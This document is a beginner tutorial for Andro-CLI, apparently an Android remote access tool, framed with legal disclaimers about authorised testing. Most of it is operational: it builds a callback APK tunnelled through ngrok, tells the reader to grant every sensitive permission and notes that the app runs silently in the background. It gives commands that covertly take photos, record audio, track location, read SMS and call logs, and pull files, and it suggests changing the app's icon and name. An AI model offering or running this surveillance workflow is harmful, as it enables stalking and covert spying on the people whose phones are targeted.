# Getting Started with Andro-CLI

## ⚠️ LEGAL DISCLAIMER

**READ THIS FIRST - VERY IMPORTANT**

This tool is designed for **EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**.

### Acceptable Use:
- ✅ Testing devices you own
- ✅ Authorized penetration testing with written permission
- ✅ Security research in controlled lab environments
- ✅ Educational demonstrations

### Prohibited Use:
- ❌ Unauthorized access to any device
- ❌ Surveillance without consent
- ❌ Any illegal activities
- ❌ Violation of privacy laws

**WARNING:** Unauthorized access to computer systems is illegal and punishable by law. Violations may result in criminal prosecution, imprisonment, and substantial fines.

**By proceeding, you acknowledge you will use this tool legally and ethically.**

---

## What You'll Learn

This quick start guide will help you:
1. ✅ Install Andro-CLI on your computer
2. ✅ Build your first APK
3. ✅ Connect to your Android device
4. ✅ Execute basic commands
5. ✅ Understand how the tool works

**Difficulty:** Beginner  
**Prerequisites:** Your own Android device (Android 7.0+)

---

## Part 1: Prerequisites Check

Before starting, you need these tools installed on your computer:

### Required Software:

#### 1. Python 3.7 or higher

**Check if installed:**
```bash
python --version
```

**Expected output:** `Python 3.x.x`

**If not installed:**
- Windows: Download from [python.org](https://www.python.org/downloads/)
- macOS: `brew install python3`
- Linux: `sudo apt install python3 python3-pip`

---

#### 2. Java Development Kit (JDK) 11 or higher

**Check if installed:**
```bash
java -version
```

**Expected output:** `java version "11.0.x"` or higher

**If not installed:**
- Download from [adoptium.net](https://adoptium.net/) (recommended)
- Or [Oracle JDK](https://www.oracle.com/java/technologies/downloads/)

---

#### 3. Android SDK (via Android Studio)

**Easiest installation method:**
1. Download [Android Studio](https://developer.android.com/studio)
2. Install and open Android Studio
3. Go to: Tools → SDK Manager
4. Install:
   - Android SDK Platform 34
   - Android SDK Build-Tools 34.0.0
   - Android SDK Platform-Tools

**Set environment variable (Windows):**
```powershell
$env:ANDROID_HOME = "C:\Users\YourUsername\AppData\Local\Android\Sdk"
```

---

#### 4. Git

**Check if installed:**
```bash
git --version
```

**If not installed:**
- Download from [git-scm.com](https://git-scm.com/)

---

### Hardware Needed:
- 💻 Computer (Windows/macOS/Linux)
- 📱 Android device (Android 7.0+) that you own
- 🔌 USB cable
- 🌐 Internet connection

---

## Part 2: Installation

### Step 1: Clone the Repository

```bash
# Navigate to your preferred folder
cd Desktop

# Clone Andro-CLI
git clone https://github.com/Kshitiz-2027/Andro-CLI.git

# Enter the directory
cd Andro-CLI

# Verify files are present
dir  # Windows
ls   # macOS/Linux
```

**Expected files:**
```
androcli.py
utils.py
requirements.txt
sign_apk.sh
Android_Code/
README.md
```

---

### Step 2: Install Python Dependencies

```bash
# Install required packages
pip install -r requirements.txt
```

**This installs:**
- `pyngrok` - For ngrok tunnel support
- Other necessary dependencies

**Expected output:**
```
Successfully installed pyngrok-7.0.0 ...
```

✅ **Installation complete!**

---

## Part 3: Build Your First APK

You have two options for building the APK:

### Option A: Using ngrok (Recommended for Beginners)

**Why ngrok?**
- ✅ Works from anywhere with internet
- ✅ No port forwarding needed
- ✅ No network configuration required
- ✅ Perfect for beginners

**Steps:**

1. **Create free ngrok account:**
   - Visit [ngrok.com](https://ngrok.com/)
   - Sign up (free)
   - Copy your authtoken from the dashboard

2. **Configure ngrok:**
   ```bash
   ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
   ```

3. **Build the APK:**
   ```bash
   python androcli.py --build --ngrok -p 4444 -o my_first_app.apk
   ```

**Build process takes 2-3 minutes. You'll see:**
```
[*] Starting ngrok tunnel...
[*] ngrok URL: https://abc123.ngrok-free.app
[*] Configuring APK...
[*] Building APK with Gradle...
BUILD SUCCESSFUL in 2m 15s
[+] APK built successfully: my_first_app.apk
```

---

### Option B: Using Local IP (Same WiFi Network)

**Use this if:**
- Both devices are on the same WiFi network
- You don't want to use ngrok

**Steps:**

1. **Find your computer's IP address:**

   **Windows:**
   ```powershell
   ipconfig
   ```
   Look for "IPv4 Address" (e.g., `192.168.1.100`)

   **macOS/Linux:**
   ```bash
   ifconfig | grep "inet "
   hostname -I
   ```

2. **Build the APK:**
   ```bash
   python androcli.py --build -i YOUR_IP_ADDRESS -p 4444 -o my_first_app.apk
   
   # Example:
   # python androcli.py --build -i 192.168.1.100 -p 4444 -o my_first_app.apk
   ```

✅ **Your APK is ready!**

---

## Part 4: Install on Android Device

### Step 1: Transfer APK to Your Device

**Method A: Direct Install via USB (Easiest)**
```bash
# Connect your Android device via USB
# Enable USB debugging on your device:
# Settings → About Phone → Tap "Build Number" 7 times
# Settings → Developer Options → Enable USB Debugging

# Verify device is connected
adb devices

# Install the APK directly
adb install my_first_app.apk
```

**Method B: Manual Transfer**
1. Connect device via USB
2. Copy `my_first_app.apk` to your phone's Download folder
3. Or email the APK to yourself and download on device

---

### Step 2: Enable Installation from Unknown Sources

**On your Android device:**

**Android 8-11:**
1. Tap the APK file in Downloads
2. If blocked, tap "Settings"
3. Enable "Allow from this source"
4. Press back and tap "Install"

**Android 12+:**
1. Settings → Apps → Special app access
2. Install unknown apps
3. Select your file manager (e.g., Files, Downloads)
4. Enable "Allow from this source"

---

### Step 3: Install and Launch

1. Open **File Manager** or **Downloads** app
2. Tap on `my_first_app.apk`
3. Tap **Install**
4. Wait 5-10 seconds
5. Tap **Open**

---

### Step 4: Grant ALL Permissions (CRITICAL!)

The app will request multiple permissions. **You MUST grant ALL of them:**

**Tap "Allow" for each:**
1. 📷 **Camera** → Allow
2. 🎤 **Microphone** → Allow
3. 📍 **Location** → **Allow all the time** (not just "while using")
4. 📁 **Files and media** → Allow
5. 📞 **Phone** → Allow
6. 💬 **SMS** → Allow
7. 👥 **Contacts** → Allow

**Additional settings:**
8. **Display over other apps** → Enable
9. **Battery optimization** → Select "Don't optimize" or "Unrestricted"

**Note:** The app screen may appear blank - this is normal! The app runs in the background.

---

## Part 5: Connect and Control

### Step 1: Start the Server

**Open a new terminal/PowerShell window:**

```bash
# Make sure you're in the Andro-CLI directory
cd Desktop\Andro-CLI

# Start the server (using ngrok)
python androcli.py --shell --ngrok -p 4444

# OR if you used local IP:
# python androcli.py --shell -i YOUR_IP -p 4444
```

**You should see the Andro-CLI banner:**
```
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗       ██████╗██╗     ██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗     ██╔════╝██║     ██║
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║     ██║     ██║     ██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║     ██║     ██║     ██║
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝     ╚██████╗███████╗██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝       ╚═════╝╚══════╝╚═╝

[*] Listening on port 4444
[*] Waiting for connections...
```

---

### Step 2: Device Connects Automatically

**Within 5-10 seconds, your device will connect:**

```
[+] New connection established!
[+] Device: Samsung SM-G973F
[+] Android Version: 12
[+] IP Address: 192.168.1.105

andro-cli> _
```

🎉 **Congratulations! You're connected!**

---

## Your First Commands

Now let's try some basic commands. Type these at the `andro-cli>` prompt:

### 1. Get Device Information

```bash
andro-cli> deviceInfo
```

**Output shows:**
- Device manufacturer and model
- Android version
- Battery level
- IP address
- IMEI and SIM info

---

### 2. List Available Cameras

```bash
andro-cli> camList
```

**Output:**
```
Available Cameras:
  [0] Back Camera
  [1] Front Camera
```

---

### 3. Take a Photo (Your First Real Action!)

```bash
# Take photo from back camera
andro-cli> camSnap 0

# Or from front camera
# andro-cli> camSnap 1
```

**Output:**
```
[*] Requesting photo from camera 0...
[*] Capturing image...
[*] Image received (2.4 MB)
[*] Saving to: captures/photo_20251016_143022.jpg
[+] Photo saved successfully!
```

**Check your captures folder to see the photo!**

---

### 4. Get Device Location

```bash
andro-cli> location
```

**Output:**
```
==================== LOCATION DATA ====================
Latitude: 37.7749
Longitude: -122.4194
Accuracy: 12 meters
Provider: GPS
Address: San Francisco, CA, United States
========================================================
```

---

### 5. Record Audio

```bash
# Record 5 seconds of audio
andro-cli> mic 5
```

**Output:**
```
[*] Starting audio recording for 5 seconds...
[*] Recording... ████████████████████ 100%
[*] Recording complete
[*] Saved: captures/audio_20251016_143145.m4a
```

---

### 6. View SMS Messages

```bash
andro-cli> smslist
```

**Shows all SMS messages on the device**

---

### 7. View Call History

```bash
andro-cli> calllog
```

**Shows incoming, outgoing, and missed calls**

---

### 8. Browse Files

```bash
# Browse the Download folder
andro-cli> fileManager /sdcard/Download
```

**Output:**
```
==================== FILE BROWSER ====================
Path: /sdcard/Download

[DIR]  📁 Pictures/
[DIR]  📁 Documents/
[FILE] 📄 report.pdf (2.4 MB)
[FILE] 🖼️ photo.jpg (3.1 MB)
========================================================
```

---

### 9. Execute Shell Commands

```bash
# Get system uptime
andro-cli> shell uptime

# Check running processes
andro-cli> shell ps

# Get device IP address
andro-cli> shell ip addr
```

---

### 10. Get Help

```bash
andro-cli> help
```

**Shows all available commands**

---

## Quick Command Reference

```bash
# DEVICE INFORMATION
deviceInfo          # Get detailed device info
camList             # List available cameras

# MEDIA CAPTURE
camSnap <0|1>       # Take photo (0=back, 1=front)
mic <seconds>       # Record audio
video <cam> <sec>   # Record video

# LOCATION
location            # Get GPS coordinates

# COMMUNICATION
smslist             # List SMS messages
sendsms <num> <msg> # Send SMS
calllog             # View call history

# FILE SYSTEM
fileManager <path>  # Browse files
download <file>     # Download file to PC

# SYSTEM
shell <command>     # Execute shell command
clipboard           # Get clipboard content

# CONTROL
exit                # Disconnect
help                # Show all commands
```

---

## Troubleshooting

### Problem: Device won't connect

**Solutions:**

1. **Check app is running:**
   - Open notification panel on Android
   - Look for app notification
   - If not present, reopen the app

2. **Verify permissions:**
   - Settings → Apps → [Your App] → Permissions
   - Ensure ALL permissions are granted
   - Location should be "Allow all the time"

3. **Check internet connection:**
   - Both devices need internet (for ngrok)
   - Or same WiFi network (for local IP)

4. **Restart everything:**
   - Close app on Android
   - Stop server (Ctrl+C)
   - Restart server
   - Reopen app on Android

5. **Check firewall:**
   - Windows: Allow Python through firewall
   - Temporarily disable firewall to test

---

### Problem: Commands fail or timeout

**Solutions:**

1. **Check internet quality:**
   - Use stable WiFi connection
   - Avoid mobile data for testing

2. **Try command again:**
   - Some commands may timeout on slow connections
   - Simply retry the command

3. **Reconnect:**
   ```bash
   andro-cli> exit
   # Wait for device to reconnect automatically
   ```

---

### Problem: "Permission Denied" errors

**Solution:**

1. On Android: Settings → Apps → [Your App] → Permissions
2. Enable ALL permissions manually
3. For Location: Select "Allow all the time"
4. Restart the app
5. Try the command again

---

### Problem: APK build fails

**Solutions:**

1. **Verify Java installation:**
   ```bash
   java -version
   javac -version
   ```
   Both should show version 11 or higher

2. **Check ANDROID_HOME:**
   ```bash
   echo $env:ANDROID_HOME  # Windows PowerShell
   ```
   Should point to your Android SDK folder

3. **Clean and rebuild:**
   ```bash
   cd Android_Code
   .\gradlew clean
   cd ..
   # Try building again
   ```

4. **Make gradlew executable (macOS/Linux):**
   ```bash
   chmod +x Android_Code/gradlew
   ```

---

### Problem: Can't install APK on Android

**Solutions:**

1. **Enable Unknown Sources:**
   - Settings → Security → Install unknown apps
   - Enable for your file manager or browser

2. **Use ADB install:**
   ```bash
   adb install -r my_first_app.apk
   ```
   The `-r` flag reinstalls if already present

3. **Check storage space:**
   - Ensure at least 100MB free space
   - Clear cache if needed

4. **Try different transfer method:**
   - If USB fails, try email or cloud storage

---

### Problem: App crashes on launch

**Solutions:**

1. **Check Android version:**
   - Minimum: Android 7.0 (API 24)
   - Check: Settings → About Phone → Android version

2. **Clear app data:**
   - Settings → Apps → [Your App]
   - Storage → Clear Data
   - Uninstall and reinstall

3. **View crash logs:**
   ```bash
   adb logcat | findstr AndroidRuntime
   ```
   Look for error messages

---

## What You've Accomplished ✅

You have successfully:

✅ Installed Andro-CLI and all dependencies  
✅ Built a custom APK file  
✅ Installed the app on your Android device  
✅ Successfully connected to your device  
✅ Executed basic commands  
✅ Captured photos remotely  
✅ Accessed device information  
✅ Learned troubleshooting basics  

**You now have a functional Android remote access tool for security research!**

---

## Next Steps

### Continue Learning:

**Week 1 - Master the Basics:**
- Try all the commands listed in the reference
- Experiment with different cameras
- Practice file browsing
- Test various shell commands

**Week 2 - Advanced Features:**
- Video recording
- SMS sending
- File downloads
- Clipboard monitoring

**Week 3 - Understanding the System:**
- Study the source code in `Android_Code/`
- Learn how persistence works
- Understand permission requirements
- Explore the Python server code

**Week 4 - Security Analysis:**
- Learn how to detect such tools
- Study mitigation strategies
- Understand privacy implications
- Practice responsible disclosure

---

### Additional Resources:

📚 **Documentation:**
- Read `README.md` for full feature list
- Review `Andro-CLI_Research_Paper.md` for technical analysis
- Study the source code for deeper understanding

🔧 **Customization:**
- Modify app icon in `Android_Code/app/src/main/res/`
- Change app name in `strings.xml`
- Adjust reconnection interval in `mainService.java`
- Add custom commands to `androcli.py`

🛡️ **Security Research:**
- [OWASP Mobile Security](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Android Security Best Practices](https://developer.android.com/training/articles/security-tips)
- [Malware Analysis Resources](https://www.malware-traffic-analysis.net/)

---

## Important Reminders

### 🔒 Legal & Ethical Use

**ALWAYS:**
- ✅ Get written permission before testing any device
- ✅ Use only on devices you personally own
- ✅ Test in isolated lab environments
- ✅ Document your testing activities
- ✅ Follow responsible disclosure practices
- ✅ Respect privacy and data protection laws

**NEVER:**
- ❌ Access devices without authorization
- ❌ Use for surveillance without consent
- ❌ Distribute to others for malicious use
- ❌ Violate computer fraud and abuse laws
- ❌ Ignore ethical boundaries

---

### 🎯 Best Practices

1. **Test Responsibly:**
   - Use dedicated test devices
   - Keep devices in controlled environment
   - Don't test on production devices

2. **Maintain Privacy:**
   - Don't capture sensitive information
   - Delete test data after use
   - Don't share captured data

3. **Stay Updated:**
   - Keep Andro-CLI updated
   - Update dependencies regularly
   - Follow security advisories

4. **Document Everything:**
   - Keep logs of your testing
   - Document findings professionally
   - Create proper reports

5. **Give Back:**
   - Report bugs you find
   - Contribute improvements
   - Help other learners
   - Share knowledge responsibly

---

## Getting Help

### Need Assistance?

1. **Check troubleshooting section** in this guide
2. **Search GitHub Issues** for similar problems
3. **Read the full README.md** documentation
4. **Review the research paper** for technical details
5. **Open a new issue** with detailed information

### When Reporting Issues, Include:

- Your operating system and version
- Python version: `python --version`
- Java version: `java -version`
- Android device model and OS version
- Complete error messages (copy/paste)
- Steps to reproduce the problem
- What you've already tried

---

## Cleanup

When you're done testing:

### Stop the Server:
```bash
# Press Ctrl+C in the terminal
```

### Uninstall from Android:
1. Settings → Apps
2. Find and select your app
3. Tap "Uninstall"
4. Confirm

### Remove Files (Optional):
```bash
# Delete captured files
rm -r captures/

# Delete the APK
rm my_first_app.apk
```

---

## Summary

**Tutorial Completed:**
- ✅ Difficulty: Beginner
- ✅ Skills learned: 10+ commands
- ✅ Hands-on experience: Yes

**You now know how to:**
- Build Android APKs with custom configurations
- Install and configure remote access tools
- Execute commands on remote Android devices
- Troubleshoot common issues
- Use the tool responsibly and ethically

---

## Final Words

**Congratulations on completing the Getting Started tutorial!** 🎉

You've taken your first steps into Android security research. Remember:

- 🎓 **Keep Learning:** Security is a continuous journey
- 🛡️ **Stay Ethical:** Always respect privacy and laws
- 🤝 **Help Others:** Share knowledge responsibly
- 📚 **Document Everything:** Maintain professional standards
- ⚖️ **Know the Law:** Understand legal boundaries in your jurisdiction

**With great power comes great responsibility.** Use Andro-CLI wisely, ethically, and legally.

---

## Quick Reference Card

### Essential Commands Cheat Sheet

```bash
# Connection
python androcli.py --shell --ngrok -p 4444    # Start server

# Information
deviceInfo                                     # Device details
camList                                        # List cameras
help                                           # Show all commands

# Actions
camSnap 0                                      # Take photo (back)
camSnap 1                                      # Take photo (front)
mic 5                                          # Record 5 sec audio
video 0 10                                     # Record 10 sec video
location                                       # Get GPS location
smslist                                        # List SMS
calllog                                        # List calls
fileManager /sdcard                            # Browse files
shell uptime                                   # Run shell command
exit                                           # Disconnect
```

Print this reference card for quick access during testing!

---

**Tutorial Version:** 1.0  
**Last Updated:** October 16, 2025  
**Difficulty Level:** ⭐ Beginner  

---

**Questions? Issues? Contributions?**

Visit the [GitHub repository](https://github.com/Kshitiz-2027/Andro-CLI) for more information.

**Happy (Ethical) Hacking!** 🔐

